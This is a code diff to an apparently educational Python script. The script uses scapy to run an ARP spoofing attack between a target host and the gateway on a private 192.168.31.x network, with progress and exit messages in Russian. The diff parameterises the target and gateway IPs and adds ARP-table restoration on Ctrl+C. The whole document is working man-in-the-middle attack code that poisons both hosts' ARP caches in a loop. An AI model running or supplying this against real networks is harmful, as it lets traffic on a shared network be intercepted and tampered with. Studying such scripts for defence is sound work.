@@ -3,6 +3,7 @@
 import scapy.all as scapy
 import time
 
+
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -17,21 +18,26 @@ def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
+
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
     packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-    print(packet.show())
-    print(packet.summary())
+    scapy.send(packet, count=4, verbose=False)
 
-restore("192.168.31.174", "192.168.31.1")
-send_packets_count = 0
+
+target_ip = "192.168.31.174"
+gateway_ip = "192.168.31.1"
+
 try:
+    send_packets_count = 0
     while True:
-        spoof("192.168.31.174", "192.168.31.1")
-        spoof("192.168.31.1", "192.168.31.174")
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
         send_packets_count = send_packets_count + 2
         print("\r[+] Отправлено пакетов: " + str(send_packets_count), end="")
         time.sleep(2)
 except KeyboardInterrupt:
-    print("\n[-] Обнаружено нажатие Ctrl + C ... Выходим\n")
+    print("\n[-] Обнаружено нажатие Ctrl + C ... Восстановдение ARP таблицы ... Пожалуйста, подождите.")
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
